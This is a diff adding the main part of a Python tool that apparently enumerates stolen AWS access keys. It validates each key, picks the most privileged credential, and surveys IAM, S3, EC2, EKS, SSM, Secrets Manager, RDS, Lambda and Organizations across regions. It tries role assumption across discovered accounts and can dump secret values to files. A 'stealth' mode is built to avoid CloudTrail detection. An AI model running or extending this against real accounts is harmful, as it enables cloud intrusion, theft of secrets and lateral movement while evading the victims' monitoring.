+                    entry["eks_clusters"][r] = eks_r["clusters"]
+                    print(f"    [{ts()}]       {r}: {eks_r['clusters']}", flush=True)
+
+            # S3
+            print(f"    [{ts()}]     S3...", flush=True)
+            s3_r = check_s3(ak, sk, st, region, timeout)
+            entry["s3"] = s3_r
+            if "error" not in s3_r:
+                print(f"    [{ts()}]       {s3_r['total']} buckets "
+                      f"({len(s3_r.get('terraform_buckets',[]))} terraform)", flush=True)
+
+            # SSM
+            print(f"    [{ts()}]     SSM...", flush=True)
+            ssm_r = check_ssm(ak, sk, st, region, timeout,
+                               pull_secrets=pull_secrets,
+                               out_dir=out_dir,
+                               account_id=account_id)
+            entry["ssm"] = ssm_r
+
+            # Secrets Manager
+            print(f"    [{ts()}]     Secrets Manager...", flush=True)
+            sm_r = check_secrets_manager(ak, sk, st, region, timeout,
+                                          pull_secrets=pull_secrets,
+                                          out_dir=out_dir,
+                                          account_id=account_id)
+            entry["secrets_manager"] = sm_r
+
+            # Get alias for the assumed account
+            assumed_alias_data, _ = safe(
+                make_client("iam", ak, sk, st, region, timeout).list_account_aliases
+            )
+            assumed_alias = (assumed_alias_data.get("AccountAliases") or [None])[0] if assumed_alias_data else None
+            if assumed_alias:
+                entry["account_alias_confirmed"] = assumed_alias
+
+            results[account_id] = entry
+            alias_display = assumed_alias or alias
+            print(f"    [{ts()}]   ✓ SUCCESS — {alias_display} ({account_id})", flush=True)
+
+        else:
+            results[account_id] = {
+                "status": "DENIED",
+                "account_alias": alias,
+                "cross_account": account_id != source_account,
+                "role_arn": role_arn,
+                "error": err
+            }
+            print(f"    [{ts()}]   ✗ {err}", flush=True)
+
+    return results
+
+
+# ─── Main enumeration ─────────────────────────────────────────────────────────
+
+def enumerate_credential(key_id, secret, token, args, extra_accounts):
+    region = args.region
+    timeout = args.timeout
+    regions = ALL_REGIONS if args.all_regions else DEFAULT_REGIONS
+    pull = args.pull_secrets
+    out_dir = args.out_dir
+
+    result = {
+        "key_id": key_id,
+        "key_type": "ASIA (temporary)" if key_id.startswith("ASIA") else "AKIA (long-term)",
+        "timestamp": datetime.now(timezone.utc).isoformat(),
+    }
+
+    sep = "─" * 60
+    print(f"\n{sep}")
+    print(f"[{ts()}] KEY: {key_id}")
+    print(sep)
+
+    # [1] Identity (base credential)
+    print(f"[{ts()}] [1] Identity...", flush=True)
+    identity, err = check_identity(key_id, secret, token, region, timeout)
+    if err:
+        print(f"[{ts()}]   ✗ INVALID — {err}", flush=True)
+        result["status"] = "INVALID"
+        result["error"] = err
+        return result
+
+    result["status"] = "VALID"
+    result["identity"] = identity
+    account_id = identity["account"]
+    print(f"[{ts()}]   ✓ ARN     : {identity['arn']}", flush=True)
+    print(f"[{ts()}]   ✓ Account : {account_id} ({identity.get('account_alias') or 'no alias'})", flush=True)
+    print(f"[{ts()}]   ✓ UserID  : {identity['user_id']}", flush=True)
+    print(f"[{ts()}]   ✓ Type    : {identity['key_type']}", flush=True)
+    if identity.get("is_root"):
+        print(f"[{ts()}]   ⚠ ROOT ACCOUNT", flush=True)
+
+    # [1b] Role assumption + privilege comparison — pick best credential
+    if not args.no_assume:
+        print(f"[{ts()}] [1b] Checking if assumed role has higher privilege...", flush=True)
+        e_key, e_secret, e_token, e_label, e_arn, all_candidates = pick_best_credential(
+            key_id, secret, token,
+            region, timeout,
+            args.role_name,
+            extra_accounts,
+            account_id,
+            args.fast
+        )
+        result["credential_used"] = {
+            "key_id": e_key,
+            "label": e_label,
+            "arn": e_arn,
+            "privilege_comparison": [
+                {"label": c["label"], "allowed": c["allowed"], "arn": c["arn"]}
+                for c in all_candidates
+            ]
+        }
+        # Swap to best credential for all subsequent checks
+        if e_key != key_id:
+            key_id, secret, token = e_key, e_secret, e_token
+            # Re-fetch identity for the assumed role
+            identity, _ = check_identity(key_id, secret, token, region, timeout)
+            account_id = identity["account"] if identity else account_id
+            print(f"[{ts()}]   ★ Switching to: {e_label}", flush=True)
+            print(f"[{ts()}]     ARN: {e_arn}", flush=True)
+        else:
+            print(f"[{ts()}]   ✓ Base credential is most privileged — continuing", flush=True)
+    else:
+        print(f"[{ts()}] [1b] Skipping role comparison (--no-assume)", flush=True)
+        result["credential_used"] = {"key_id": key_id, "label": "base", "arn": identity["arn"]}
+
+    # [2] IAM
+    print(f"[{ts()}] [2] IAM...", flush=True)
+    iam = check_iam(key_id, secret, token, region, timeout, identity)
+    result["iam"] = iam
+    if iam.get("username"):
+        print(f"[{ts()}]   Username         : {iam['username']}", flush=True)
+        print(f"[{ts()}]   Created          : {iam.get('created','')}", flush=True)
+        print(f"[{ts()}]   Groups           : {iam.get('groups', [])}", flush=True)
+        print(f"[{ts()}]   Attached policies: {iam.get('attached_policies', [])}", flush=True)
+        print(f"[{ts()}]   Inline policies  : {iam.get('inline_policies', [])}", flush=True)
+        if iam.get("access_keys"):
+            for k in iam["access_keys"]:
+                print(f"[{ts()}]   Key: {k['key_id']} | {k['status']} | created {k['created']}", flush=True)
+    if iam.get("visible_users"):
+        print(f"[{ts()}]   Visible users : {len(iam['visible_users'])}", flush=True)
+    if iam.get("visible_roles"):
+        print(f"[{ts()}]   Visible roles : {len(iam['visible_roles'])}", flush=True)
+
+    # [3] Privilege simulation
+    jitter(getattr(args, "stealth", False))
+    if getattr(args, "stealth", False):
+        print(f"[{ts()}] [3] Privilege simulation — SKIPPED (stealth mode)", flush=True)
+        result["privs"] = {"skipped": "stealth mode"}
+    elif not args.fast:
+        print(f"[{ts()}] [3] Privilege simulation ({len(PRIV_CHECKS)} actions)...", flush=True)
+        privs = check_privs(key_id, secret, token, region, timeout, identity)
+        result["privs"] = privs
+        if "allowed" in privs:
+            print(f"[{ts()}]   Allowed  : {len(privs['allowed'])}/{len(PRIV_CHECKS)}", flush=True)
+            if privs.get("high_value"):
+                print(f"[{ts()}]   ⚠ HIGH VALUE PERMISSIONS:", flush=True)
+                for hv in privs["high_value"]:
+                    print(f"[{ts()}]     → {hv}", flush=True)
+        else:
+            print(f"[{ts()}]   {privs.get('error', 'no data')}", flush=True)
+    else:
+        print(f"[{ts()}] [3] Skipping priv simulation (--fast)", flush=True)
+        result["privs"] = {}
+
+    # [4] S3
+    jitter(getattr(args, "stealth", False))
+    print(f"[{ts()}] [4] S3...", flush=True)
+    s3 = check_s3(key_id, secret, token, region, timeout)
+    result["s3"] = s3
+    if "error" not in s3:
+        print(f"[{ts()}]   Total     : {s3['total']}", flush=True)
+        print(f"[{ts()}]   Terraform : {len(s3.get('terraform_buckets',[]))} buckets", flush=True)
+        print(f"[{ts()}]   Backup    : {len(s3.get('backup_buckets',[]))} buckets", flush=True)
+        print(f"[{ts()}]   Logs      : {len(s3.get('log_buckets',[]))} buckets", flush=True)
+    else:
+        print(f"[{ts()}]   ✗ {s3['error']}", flush=True)
+
+    # [5] EC2 — all regions
+    print(f"[{ts()}] [5] EC2 (all {len(regions)} regions)...", flush=True)
+    result["ec2"] = {}
+    ec2_total_inst = 0
+    ec2_total_vpcs = 0
+    for r in regions:
+        ec2 = check_ec2(key_id, secret, token, r, timeout)
+        inst = ec2.get("running_count", 0)
+        vpcs = len(ec2.get("vpcs", []))
+        if inst > 0 or vpcs > 0:
+            result["ec2"][r] = ec2
+            ec2_total_inst += inst
+            ec2_total_vpcs += vpcs
+            print(f"[{ts()}]   {r}: {inst} instances, {vpcs} VPCs", flush=True)
+            for i in ec2.get("running_instances", [])[:3]:
+                print(f"[{ts()}]     {i['id']} | {i['type']} | {i.get('private_ip','')} | {i['name']}", flush=True)
+    if ec2_total_inst == 0 and ec2_total_vpcs == 0:
+        print(f"[{ts()}]   Nothing accessible", flush=True)
+    print(f"[{ts()}]   Total: {ec2_total_inst} instances, {ec2_total_vpcs} VPCs", flush=True)
+
+    # [6] EKS via list-clusters API
+    jitter(getattr(args, "stealth", False))
+    print(f"[{ts()}] [6] EKS clusters across {len(regions)} regions...", flush=True)
+    eks = check_eks(key_id, secret, token, timeout, regions)
+    result["eks"] = eks
+    cluster_regions = {k: v for k, v in eks.items() if not k.endswith("_details")}
+    if cluster_regions:
+        total = sum(len(v) for v in cluster_regions.values())
+        print(f"[{ts()}]   ✓ {total} cluster(s) found:", flush=True)
+        for r, clusters in cluster_regions.items():
+            for c in clusters:
+                details = eks.get(f"{r}_details", {}).get(c, {})
+                print(f"[{ts()}]     {r} / {c} | {details.get('status','')} | k8s {details.get('version','')}", flush=True)
+    else:
+        print(f"[{ts()}]   No clusters accessible via list-clusters", flush=True)
+
+    # [7] ECR — all regions
+    print(f"[{ts()}] [7] ECR (all {len(regions)} regions)...", flush=True)
+    result["ecr"] = {}
+    ecr_total = 0
+    for r in regions:
+        ecr = check_ecr(key_id, secret, token, r, timeout)
+        if ecr["total"] > 0:
+            result["ecr"][r] = ecr
+            ecr_total += ecr["total"]
+            print(f"[{ts()}]   {r}: {ecr['total']} repos", flush=True)
+            print(f"[{ts()}]     Sample: {[x['name'] for x in ecr['repos'][:3]]}"
+                  f"{'...' if ecr['total'] > 3 else ''}", flush=True)
+    if ecr_total == 0:
+        print(f"[{ts()}]   Nothing accessible", flush=True)
+    print(f"[{ts()}]   Total across all regions: {ecr_total} repos", flush=True)
+
+    # [8] SSM — all regions
+    print(f"[{ts()}] [8] SSM (all {len(regions)} regions)...", flush=True)
+    result["ssm"] = {}
+    ssm_total_params = 0
+    ssm_total_instances = 0
+    for r in regions:
+        print(f"[{ts()}]   → {r}...", flush=True)
+        ssm = check_ssm(key_id, secret, token, r, timeout,
+                        pull_secrets=pull, out_dir=out_dir,
+                        account_id=f"{account_id}",
+                        stealth=getattr(args, "stealth", False))
+        result["ssm"][r] = ssm
+        inst_count = ssm.get("managed_instances_count", 0)
+        param_count = ssm.get("parameter_count", 0)
+        ssm_total_params += param_count
+        ssm_total_instances += inst_count
+        if inst_count > 0 or param_count > 0:
+            print(f"[{ts()}]     Instances  : {inst_count}", flush=True)
+            if ssm.get("managed_instances"):
+                for inst in ssm["managed_instances"][:3]:
+                    print(f"[{ts()}]       {inst['id']} | {inst['ip']} | {inst['platform']} | {inst['ping']}", flush=True)
+            print(f"[{ts()}]     Parameters : {param_count} ({ssm.get('secure_string_count',0)} SecureString)", flush=True)
+            if ssm.get("params_file"):
+                print(f"[{ts()}]     Names  → {ssm['params_file']}", flush=True)
+            if ssm.get("secrets_file"):
+                print(f"[{ts()}]     Values → {ssm['secrets_file']} ({ssm.get('readable_count',0)} readable)", flush=True)
+            gpa = ssm.get("get_parameter_access", "NOT TESTED")
+            print(f"[{ts()}]     GetParameter : {'⚠' if 'ALLOWED' in str(gpa) else '✗'} {gpa}", flush=True)
+            sc = ssm.get("send_command_access", "NOT TESTED")
+            print(f"[{ts()}]     SendCommand  : {'⚠' if 'ALLOWED' in str(sc) else '✗'} {sc}", flush=True)
+        else:
+            print(f"[{ts()}]     Nothing accessible", flush=True)
+    print(f"[{ts()}]   Total across all regions: {ssm_total_instances} instances, {ssm_total_params} params", flush=True)
+
+    # [9] Secrets Manager — all regions
+    print(f"[{ts()}] [9] Secrets Manager (all {len(regions)} regions)...", flush=True)
+    result["secrets_manager"] = {}
+    sm_total = 0
+    for r in regions:
+        print(f"[{ts()}]   → {r}...", flush=True)
+        sm = check_secrets_manager(key_id, secret, token, r, timeout,
+                                    pull_secrets=pull, out_dir=out_dir,
+                                    account_id=f"{account_id}")
+        result["secrets_manager"][r] = sm
+        if "error" not in sm and sm.get("total", 0) > 0:
+            sm_total += sm["total"]
+            print(f"[{ts()}]     {sm['total']} secrets", flush=True)
+            if sm.get("names_file"):
+                print(f"[{ts()}]     Names → {sm['names_file']}", flush=True)
+            if sm.get("values_file"):
+                print(f"[{ts()}]     Values → {sm['values_file']} ({sm.get('readable_count',0)} readable)", flush=True)
+        else:
+            print(f"[{ts()}]     Nothing accessible", flush=True)
+    print(f"[{ts()}]   Total across all regions: {sm_total} secrets", flush=True)
+
+    # [10] RDS — all regions
+    print(f"[{ts()}] [10] RDS (all {len(regions)} regions)...", flush=True)
+    result["rds"] = {}
+    rds_total_inst = 0
+    rds_total_clus = 0
+    for r in regions:
+        rds = check_rds(key_id, secret, token, r, timeout)
+        inst = rds.get("instances", [])
+        clus = rds.get("clusters", [])
+        if inst or clus:
+            result["rds"][r] = rds
+            rds_total_inst += len(inst)
+            rds_total_clus += len(clus)
+            print(f"[{ts()}]   {r}: {len(inst)} instances, {len(clus)} clusters", flush=True)
+            for i in inst:
+                print(f"[{ts()}]     {i['id']} | {i['engine']} | {i['endpoint']} | "
+                      f"public={i['publicly_accessible']}", flush=True)
+    if rds_total_inst == 0 and rds_total_clus == 0:
+        print(f"[{ts()}]   Nothing accessible", flush=True)
+    print(f"[{ts()}]   Total: {rds_total_inst} instances, {rds_total_clus} clusters", flush=True)
+
+    # [11] Lambda — all regions
+    print(f"[{ts()}] [11] Lambda (all {len(regions)} regions)...", flush=True)
+    result["lambda"] = {}
+    lambda_total = 0
+    for r in regions:
+        lam = check_lambda(key_id, secret, token, r, timeout)
+        if lam["total"] > 0:
+            result["lambda"][r] = lam
+            lambda_total += lam["total"]
+            print(f"[{ts()}]   {r}: {lam['total']} functions", flush=True)
+            for fn in lam["functions"][:3]:
+                print(f"[{ts()}]     {fn['name']} | {fn.get('runtime','')} | {fn.get('role','')[:60]}", flush=True)
+    if lambda_total == 0:
+        print(f"[{ts()}]   Nothing accessible", flush=True)
+    print(f"[{ts()}]   Total: {lambda_total} functions", flush=True)
+
+    # [12] CloudWatch Logs — all regions
+    print(f"[{ts()}] [12] CloudWatch Logs (all {len(regions)} regions)...", flush=True)
+    result["logs"] = {}
+    logs_total = 0
+    for r in regions:
+        logs = check_logs(key_id, secret, token, r, timeout)
+        if "error" not in logs and logs.get("total", 0) > 0:
+            result["logs"][r] = logs
+            logs_total += logs["total"]
+            print(f"[{ts()}]   {r}: {logs['total']} log groups", flush=True)
+    if logs_total == 0:
+        print(f"[{ts()}]   Nothing accessible", flush=True)
+    print(f"[{ts()}]   Total: {logs_total} log groups", flush=True)
+
+    # [13] Organizations
+    print(f"[{ts()}] [13] Organizations...", flush=True)
+    org = check_org(key_id, secret, token, region, timeout)
+    result["organizations"] = org
+    if "error" not in org:
+        print(f"[{ts()}]   Org ID        : {org.get('org_id')}", flush=True)
+        print(f"[{ts()}]   Master account: {org.get('master_account')}", flush=True)
+        print(f"[{ts()}]   Master email  : {org.get('master_email')}", flush=True)
+        if org.get("accounts_error"):
+            print(f"[{ts()}]   Accounts      : ✗ {org['accounts_error']}", flush=True)
+        elif org.get("accounts"):
+            print(f"[{ts()}]   Accounts      : {org.get('account_count',0)} (feeding into role assumption)", flush=True)
+            for a in org["accounts"]:
+                print(f"[{ts()}]     {a['id']} | {a['name']:40s} | {a['status']}", flush=True)
+        else:
+            print(f"[{ts()}]   Accounts      : none enumerated", flush=True)
+    else:
+        print(f"[{ts()}]   ✗ {org['error']}", flush=True)
+
+    # [14] Full role assumption — try all accounts (org-discovered + user-provided + own)
+    if not args.no_assume:
+        stealth_mode = getattr(args, "stealth", False)
+        print(f"[{ts()}] [14] Full role assumption "
+              f"{'(own account only — stealth mode)' if stealth_mode else 'across all known accounts'}...",
+              flush=True)
+
+        assume_accounts = {}
+
+        if stealth_mode:
+            # Stealth: only try own account to avoid cross-account CloudTrail noise
+            assume_accounts[account_id] = f"account-{account_id}"
+            print(f"[{ts()}]   Stealth: limiting to own account only", flush=True)
+        else:
+            assume_accounts = dict(extra_accounts)
+            # Feed in org-discovered accounts
+            if "accounts" in org and org.get("accounts"):
+                for a in org["accounts"]:
+                    if a["id"] not in assume_accounts:
+                        assume_accounts[a["id"]] = a["name"]
+                print(f"[{ts()}]   {len(org['accounts'])} accounts from Organizations", flush=True)
+            # Always include own account
+            if account_id not in assume_accounts:
+                assume_accounts[account_id] = f"account-{account_id}"
+
+        print(f"[{ts()}]   Total targets: {len(assume_accounts)} accounts", flush=True)
+
+        assumed = attempt_role_assumption(
+            key_id, secret, token, region, timeout,
+            role_name=args.role_name,
+            accounts=assume_accounts,
+            source_account=account_id,
+            pull_secrets=pull,
+            out_dir=out_dir
+        )
+        result["role_assumption"] = assumed
+
+        successes = {k: v for k, v in assumed.items() if v.get("status") == "SUCCESS"}
+        if successes:
+            print(f"[{ts()}]   ⚠ ASSUMED {args.role_name} IN {len(successes)} ACCOUNT(S):", flush=True)
+            for aid, data in successes.items():
+                cross = " (cross-account)" if data.get("cross_account") else " (own account)"
+                print(f"[{ts()}]     → {data['account_alias']} ({aid}){cross}", flush=True)
+                eks_t = sum(len(c) for c in data.get("eks_clusters", {}).values())
+                print(f"[{ts()}]       EKS : {eks_t} clusters", flush=True)
+                print(f"[{ts()}]       S3  : {data.get('s3',{}).get('total',0)} buckets", flush=True)
+                ssm_d = data.get("ssm", {})
+                print(f"[{ts()}]       SSM : {ssm_d.get('parameter_count',0)} params", flush=True)
+                if ssm_d.get("params_file"):
+                    print(f"[{ts()}]         → {ssm_d['params_file']}", flush=True)
+                if ssm_d.get("secrets_file"):
+                    print(f"[{ts()}]         → {ssm_d['secrets_file']}", flush=True)
+                sm_d = data.get("secrets_manager", {})
+                print(f"[{ts()}]       SM  : {sm_d.get('total',0)} secrets", flush=True)
+                if sm_d.get("names_file"):
+                    print(f"[{ts()}]         → {sm_d['names_file']}", flush=True)
+        else:
+            print(f"[{ts()}]   All attempts denied", flush=True)
+    else:
+        print(f"[{ts()}] [14] Skipping role assumption (--no-assume)", flush=True)
+        result["role_assumption"] = {}
+
+    return result
+
+
+# ─── Summary ─────────────────────────────────────────────────────────────────
+
+def print_summary(all_results):
+    print(f"\n{'═'*60}")
+    print("  SUMMARY")
+    print(f"{'═'*60}")
+
+    valid = [r for r in all_results if r.get("status") == "VALID"]
+    invalid = [r for r in all_results if r.get("status") == "INVALID"]
+
+    print(f"  Total   : {len(all_results)}")
+    print(f"  Valid   : {len(valid)}")
+    print(f"  Invalid : {len(invalid)}")
+
+    for r in valid:
+        ident = r.get("identity", {})
+        eks = {k: v for k, v in r.get("eks", {}).items() if not k.endswith("_details")}
+        eks_count = sum(len(v) for v in eks.values())
+        assumed = sum(1 for v in r.get("role_assumption", {}).values()
+                      if v.get("status") == "SUCCESS")
+        hv = r.get("privs", {}).get("high_value", [])
+
+        print(f"\n  ┌─ {r['key_id']}")
+        alias = ident.get('account_alias')
+        acct_str = f"{ident.get('account','N/A')} ({alias})" if alias else ident.get('account','N/A')
+        print(f"  │  ARN          : {ident.get('arn','N/A')}")
+        print(f"  │  Account      : {acct_str}")
+        ec2_inst = sum(v.get("running_count",0) for v in r.get("ec2",{}).values() if isinstance(v, dict))
+        print(f"  │  EC2 instances: {ec2_inst}")
+        print(f"  │  S3 buckets   : {r.get('s3',{}).get('total',0)}")
+        print(f"  │  EKS clusters : {eks_count}")
+        ecr_total = sum(v.get("total",0) for v in r.get("ecr",{}).values() if isinstance(v, dict))
+        ssm_total = sum(v.get("parameter_count",0) for v in r.get("ssm",{}).values() if isinstance(v, dict))
+        sm_total  = sum(v.get("total",0) for v in r.get("secrets_manager",{}).values() if isinstance(v, dict))
+        rds_total = sum(len(v.get("instances",[])) for v in r.get("rds",{}).values() if isinstance(v, dict))
+        lam_total = sum(v.get("total",0) for v in r.get("lambda",{}).values() if isinstance(v, dict))
+        ssm_inst  = sum(v.get("managed_instances_count",0) for v in r.get("ssm",{}).values() if isinstance(v, dict))
+        print(f"  │  ECR repos    : {ecr_total}")
+        print(f"  │  SSM params   : {ssm_total} ({ssm_inst} managed instances)")
+        print(f"  │  SM secrets   : {sm_total}")
+        print(f"  │  RDS          : {rds_total}")
+        print(f"  │  Lambda       : {lam_total}")
+        if assumed:
+            print(f"  │  Role assumed : ⚠ {assumed} account(s)")
+        if hv:
+            print(f"  │  High privs  : {', '.join(hv[:3])}{'...' if len(hv)>3 else ''}")
+        print(f"  └{'─'*50}")
+
+    print(f"{'═'*60}\n")
+
+
+# ─── Entry point ─────────────────────────────────────────────────────────────
+
+def load_credentials(args):
+    creds = []
+    if args.cred:
+        parts = args.cred.strip().split(":", 2)
+        if len(parts) >= 2:
+            creds.append((parts[0], parts[1], parts[2] if len(parts) > 2 else None))
+    if args.file:
+        if not os.path.exists(args.file):
+            print(f"[!] File not found: {args.file}", file=sys.stderr)
+            sys.exit(1)
+        with open(args.file) as f:
+            for line in f:
+                line = line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                parts = line.split(":", 2)
+                if len(parts) >= 2:
+                    creds.append((parts[0], parts[1], parts[2] if len(parts) > 2 else None))
+    return creds
+
+
+def choose_credential(creds):
+    """Interactive credential selection menu"""
+    print(f"\n{'─'*60}")
+    print(f"  SELECT CREDENTIAL")
+    print(f"{'─'*60}")
+    for i, (key_id, secret, token) in enumerate(creds):
+        key_type = "ASIA (temp)" if key_id.startswith("ASIA") else "AKIA (long)"
+        token_flag = " [+token]" if token else ""
+        print(f"  [{i+1}] {key_id} ({key_type}){token_flag}")
+    print(f"  [0] Exit")
+    print(f"{'─'*60}")
+
+    while True:
+        try:
+            choice = input("  Choose: ").strip()
+            if choice == "0":
+                return None
+            idx = int(choice) - 1
+            if 0 <= idx < len(creds):
+                return idx
+            print(f"  [!] Invalid choice — enter 1-{len(creds)} or 0 to exit")
+        except (ValueError, EOFError, KeyboardInterrupt):
+            return None
+
+
+if __name__ == "__main__":
+    args = parse_args()
+    banner()
+
+    if args.out_dir is None:
+        args.out_dir = os.path.join(os.getcwd(), f"aws_enum_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
+    os.makedirs(args.out_dir, exist_ok=True)
+    print(f"[{ts()}] Out dir      : {args.out_dir}")
+    extra_accounts = load_accounts(args)
+    creds = load_credentials(args)
+
+    if not creds:
+        print("[!] No valid credentials found", file=sys.stderr)
+        sys.exit(1)
+
+    print(f"[{ts()}] Loaded {len(creds)} credential(s)")
+    print(f"[{ts()}] Role         : {args.role_name}")
+    print(f"[{ts()}] All regions  : {args.all_regions}")
+    print(f"[{ts()}] Pull secrets : {args.pull_secrets}")
+    print(f"[{ts()}] Fast mode    : {args.fast}")
+    print(f"[{ts()}] Stealth mode : {getattr(args, 'stealth', False)}")
+
+    all_results = []
+    tested = set()
+
+    # If single credential via -c, skip menu
+    if args.cred and not args.file:
+        key_id, secret, token = creds[0]
+        result = enumerate_credential(key_id, secret, token, args, extra_accounts)
+        all_results.append(result)
+    else:
+        # Interactive selection loop
+        while True:
+            remaining = [(i, c) for i, c in enumerate(creds) if i not in tested]
+            if not remaining:
+                print(f"\n[{ts()}] All credentials have been tested.")
+                break
+
+            display_creds = [c for _, c in remaining]
+            display_idx_map = [i for i, _ in remaining]
+
+            print(f"\n[{ts()}] {len(remaining)} credential(s) remaining untested")
+            choice = choose_credential(display_creds)
+
+            if choice is None:
+                print(f"[{ts()}] Exiting.")
+                break
+
+            actual_idx = display_idx_map[choice]
+            key_id, secret, token = creds[actual_idx]
+            tested.add(actual_idx)
+
+            result = enumerate_credential(key_id, secret, token, args, extra_accounts)
+            all_results.append(result)
+
+            remaining_after = [i for i, _ in enumerate(creds) if i not in tested]
+            if remaining_after:
+                print(f"\n[{ts()}] {len(remaining_after)} credential(s) still untested.")
+                try:
+                    cont = input(f"  Continue with another? [Y/n]: ").strip().lower()
+                    if cont in ("n", "no", "q", "quit", "exit"):
+                        print(f"[{ts()}] Done.")
+                        break
+                except (EOFError, KeyboardInterrupt):
+                    break
+            else:
+                print(f"\n[{ts()}] All credentials tested.")
+                break
+
+    if all_results:
+        print_summary(all_results)
+
+    for r in all_results:
+        if r.get("status") != "VALID":
+            continue
+        key_id = r.get("key_id", "unknown")
+        if args.output and args.output != "__auto__":
+            out_path = args.output
+        else:
+            out_path = os.path.join(args.out_dir, f"{key_id}.json")
+        with open(out_path, "w") as f:
+            json.dump(r, f, indent=2, default=str)
+        print(f"[{ts()}] ✓ JSON saved to {out_path}")
